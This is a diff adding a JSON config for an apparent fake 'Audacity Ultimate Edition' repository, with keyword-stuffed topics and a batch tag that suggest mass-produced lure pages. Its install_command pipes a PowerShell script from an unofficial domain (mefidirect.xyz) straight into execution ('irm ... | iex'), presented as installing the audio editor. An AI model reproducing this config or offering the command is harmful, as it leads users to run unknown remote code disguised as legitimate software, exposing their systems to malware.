@@ -1,0 +1,27 @@
+{
+  "repo": "audacity-ultimate-edition",
+  "product": "Audacity Ultimate Edition",
+  "kind": "audio",
+  "install_type": "download",
+  "download_url": "https://audacity.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "audio",
+  "topics": [
+    "audacity-portable-ready",
+    "audacity-for-windows",
+    "daily-driver",
+    "sample-library",
+    "audio-mixing",
+    "audacity-user-guide",
+    "zip-package",
+    "local-first",
+    "sound-design",
+    "audacity-offline-installer",
+    "pro-workflow",
+    "audacity-client",
+    "audacity-windows-guide"
+  ]
+}
